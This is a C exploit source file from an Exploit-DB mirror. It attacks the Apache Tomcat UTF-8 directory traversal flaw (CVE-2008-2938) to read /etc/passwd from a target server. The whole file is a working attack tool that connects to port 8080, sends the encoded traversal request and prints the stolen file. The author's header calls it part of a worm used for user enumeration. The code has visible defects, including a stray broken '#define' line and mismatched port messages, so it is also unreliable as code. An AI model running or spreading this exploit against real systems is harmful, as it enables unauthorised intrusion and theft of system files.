/*
  Exploit: Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal
      URL: https://www.exploit-db.com/exploits/14489
     Path: /usr/share/exploitdb/exploits/unix/remote/14489.c
    Codes: CVE-2008-2938
 Verified: True
File Type: C source, ASCII text

Apache Tomcat < 6.0.18 UTF8 Directory Traversal Vulnerability get /etc/passwd Exploit
c0d3r: mywisdom
thanks for not being lame to change exploit author
tis is one of my linux w0rm module for user enumerations, i've dual os worm
thanks to: gunslinger,flyf666,petimati,kiddies,xtr0nic,c0mrade,n0te,v3n0m,iblis muda,cr4wl3r
thanks to: isa m said, whitecyber
thanks to all devilzc0de crews and members, all jasakom crews and members
    * EDB-ID: 6229
    * CVE: 2008-2938
    * OSVDB-ID: 47464
    * Author: Simon Ryeo
    * Published: 2008-08-11
    * Verified: Verified
greetz to inj3ct0r crews:
31337 Inj3ct0r Members:

cr4wl3r, The_Exploited, eidelweiss, SeeMe, XroGuE, agix, gunslinger_, Sn!pEr.S!Te, indoushka,

Sid3^effects, L0rd CrusAd3r, Th3 RDX, r45c4l, Napst3r?, etc..
not so good but worth to try if our target directory structure has /usr/local/wwwroot
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#define EXPLOIT "GET /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.0\n\n"
#define RCVBUFSIZE 9999
#define tester "root:x"

void cls()
 {
 char esc = 27;
 printf("%c%s",esc,"[2J");
 printf("%c%s",esc,"[1;1H");
 }
int main(int argc,char **argv)
{
if(argc<2)
  { /**checking argument to avoid memory wasting for useless variables in vma**/ 
   cls(); printf("\nApache Tomcat < 6.0.18 UTF8 Directory Traversal Vulnerability 
   get /etc/passwd Exploit\n"); printf("\nc0d3r: mywisdom\n"); 
   printf("\nusage:./tomcatevil hotname\n"); exit(1);
#define EXPLOIT "G  }
else
 {

 int port=8080;
 char echobuf[RCVBUFSIZE];
 int rval,sockfd, bytesrcv, totalbytes;
 struct hostent *he;
 struct sockaddr_in their_addr;
 if((he=gethostbyname(argv[1])) == NULL)
  {
   perror("\nSorry please recheck your target hostname !\n");
   exit(1);
  }
  else
  {
   if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
     perror("socket()");
     exit(1);
    }
    else
    {
        //exploiting and try to get /etc/passwd
  their_addr.sin_family = AF_INET;

 printf("\n[-]Checking whether port %d opens or not\n",port);
 their_addr.sin_port = htons(port);
 their_addr.sin_addr = *((struct in_addr *)he->h_addr);
 memset(&(their_addr.sin_zero), '\0', 8);
 if(connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1)
  {
  perror("failed to connect !!!");

  }
 else
 {
 printf("\n[+]Port 80 opens !!! now sending your exploit to our target\n");
 if(send(sockfd, EXPLOIT,999,0)==-1)
   {
 perror ("send");
   }
 else
   {
       totalbytes=0;
       while (totalbytes < RCVBUFSIZE)
        {

        if ((bytesrcv = recv(sockfd, echobuf, RCVBUFSIZE - 1, 0)) <= 0)
            {

            }
            else
            {
              totalbytes += bytesrcv;
              echobuf[bytesrcv] = '\0';

            }
           totalbytes++;
        }


   }

   if(echobuf)
       {

        rval=strstr (echobuf, tester);
          if(rval)
             {
            printf(echobuf);
            printf("\n[+]w00t!!! target vulnerable! exploitation success u may see /etc/passwd above !!!\n");
            exit(1);
             }
             else
            {
            printf(echobuf);
            printf("\n[-]target not vulnerable !!!\n");
            exit(1);
            }
       }

 }
 close(sockfd);



       //eof exploiting

    }
   }

 }


}

